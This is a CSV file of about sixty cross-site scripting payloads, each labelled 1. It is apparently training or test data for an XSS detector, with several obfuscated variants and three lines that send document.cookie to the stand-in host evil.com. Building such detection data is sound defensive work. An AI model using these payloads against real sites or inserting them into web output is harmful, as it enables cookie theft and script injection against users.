"payload","label"
"<script>alert(1)</script>","1"
"<img src=x onerror=alert(1)>","1"
"<a href=""javascript:alert(1)"">Click here</a>","1"
"<svg onload=alert(1)>","1"
"<iframe src=""javascript:alert(1)""></iframe>","1"
"<body onload=alert(1)>","1"
"<math><maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(1)"">CLICKME</maction></math>","1"
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>","1"
"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></embed>","1"
"<script>eval(atob(""YWxlcnQoMSk=""))</script>","1"
"<img src=""data:image/png;base64,iVBORw0KGgo="" onload=""alert(1)"">","1"
"<link rel=""stylesheet"" href=""javascript:alert(1)"">","1"
"<meta http-equiv=""refresh"" content=""0;url=javascript:alert(1)"">","1"
"<base href=""javascript:alert(1)//"">","1"
"<form action=""javascript:alert(1)""><input type=submit></form>","1"
"<button formaction=""javascript:alert(1)"">X</button>","1"
"<input type=""image"" src=""x"" onerror=""alert(1)"">","1"
"<video poster=""javascript:alert(1)""></video>","1"
"<audio src=""x"" onerror=""alert(1)""></audio>","1"
"<source src=""javascript:alert(1)"">","1"
"<script>document.cookie</script>","1"
"<script>window.location='http://evil.com/?c='+document.cookie</script>","1"
"<img src=1 onerror=""this.src='http://evil.com/'+document.cookie"">","1"
"<body onload=""document.location='http://evil.com/'+document.cookie"">","1"
"<details open ontoggle=alert(1)>","1"
"<marquee onstart=alert(1)>","1"
"<input autofocus onfocus=alert(1)>","1"
"<select autofocus onfocus=alert(1)>","1"
"<textarea autofocus onfocus=alert(1)>","1"
"<keygen autofocus onfocus=alert(1)>","1"
"<video><source onerror=""javascript:alert(1)"">","1"
"<audio src=x onerror=alert(1)>","1"
"<object type=""text/html"" data=""javascript:alert(1)"">","1"
"<embed src=""data:text/html,<script>alert(1)<\/script>"">","1"
"<svg><script>alert(1)</script></svg>","1"
"<math><script>alert(1)</script></math>","1"
"<svg onload=alert(1)>","1"
"<svg><animate onbegin=alert(1) attributeName=x dur=1s>","1"
"<svg><set onbegin=alert(1) attributeName=x>","1"
"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>","1"
"<script>window['alert'](1)</script>","1"
"<script>top['alert'](1)</script>","1"
"<script>self['alert'](1)</script>","1"
"<script src=""data:,alert(1)""></script>","1"
"<script>setTimeout('alert(1)',0)</script>","1"
"<script>setInterval('alert(1)',9999)</script>","1"
"<a href=""&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"">click</a>","1"
"<a href=""jAvAsCrIpT:alert(1)"">click</a>","1"
"<a href=""javascript&#58;alert(1)"">XSS</a>","1"
"<a href=""  javascript:alert(1)"">XSS</a>","1"
"<img src=`x`onerror=alert(1)>","1"
"<img src='x' onerror='alert(1)'>","1"
"<img/src=x onerror=alert(1)>","1"
"<img src=x onerror=alert(String.fromCharCode(88,83,83))>","1"
"<link rel=import href=""data:text/html,<script>alert(1)<\/script>"">","1"
"<meta http-equiv=""refresh"" content=""0; url=javascript:alert(1)"">","1"
"<base href=""javascript:alert(1)//"">","1"
"<form><button formaction=""javascript:alert(1)"">X</button></form>","1"
"<isindex type=image src=1 onerror=alert(1)>","1"
